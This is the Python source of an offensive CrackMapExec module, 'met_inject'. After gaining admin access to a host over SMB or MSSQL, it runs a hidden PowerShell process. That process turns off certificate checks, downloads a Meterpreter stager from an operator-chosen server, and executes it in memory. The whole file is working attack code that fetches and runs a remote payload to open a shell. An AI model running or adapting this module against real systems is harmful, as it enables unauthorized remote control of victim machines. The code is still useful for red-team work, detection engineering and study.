from cme.helpers.powershell import *
from sys import exit

class CMEModule:
    '''
        Downloads the Meterpreter stager and injects it into memory using PowerSploit's Invoke-Shellcode.ps1 script
        Module by @byt3bl33d3r
    '''
    name = 'met_inject'
    description = "Downloads the Meterpreter stager and injects it into memory"
    supported_protocols = ['smb', 'mssql']
    opsec_safe = True
    multiple_hosts = True

    def options(self, context, module_options):
        '''
            SRVHOST     IP hosting of the stager server
            SRVPORT     Stager port
            RAND        Random string given by metasploit
            SSL         Stager server use https or http (default: https)
        '''

        self.met_ssl = 'https'

        if not 'SRVHOST' in module_options or not 'SRVPORT' in module_options or not 'RAND' in module_options:
            context.log.error('SRVHOST and SRVPORT  and RAND options are required!')
            exit(1)

        if 'SSL' in module_options:
            self.met_ssl = module_options['SSL']

        self.srvhost = module_options['SRVHOST']
        self.srvport = module_options['SRVPORT']
        self.rand = module_options['RAND']

    def on_admin_login(self, context, connection):
        # stolen from https://github.com/jaredhaight/Invoke-MetasploitPayload
        command = """$url="{}://{}:{}/{}"
        $DownloadCradle ='[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {{$true}};$client = New-Object Net.WebClient;$client.Proxy=[Net.WebRequest]::GetSystemWebProxy();$client.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;Invoke-Expression $client.downloadstring('''+$url+'''");'
        $PowershellExe=$env:windir+'\\syswow64\\WindowsPowerShell\\v1.0\powershell.exe'
        if([Environment]::Is64BitProcess) {{ $PowershellExe='powershell.exe'}}
        $ProcessInfo = New-Object System.Diagnostics.ProcessStartInfo
        $ProcessInfo.FileName=$PowershellExe
        $ProcessInfo.Arguments="-nop -c $DownloadCradle"
        $ProcessInfo.UseShellExecute = $False
        $ProcessInfo.RedirectStandardOutput = $True
        $ProcessInfo.CreateNoWindow = $True
        $ProcessInfo.WindowStyle = "Hidden"
        $Process = [System.Diagnostics.Process]::Start($ProcessInfo)""".format(
                'http' if self.met_ssl == 'http' else 'https', 
                self.srvhost, 
                self.srvport, 
                self.rand)
        context.log.debug(command)
        connection.ps_execute(command, force_ps32=True)
        context.log.success('Executed payload')
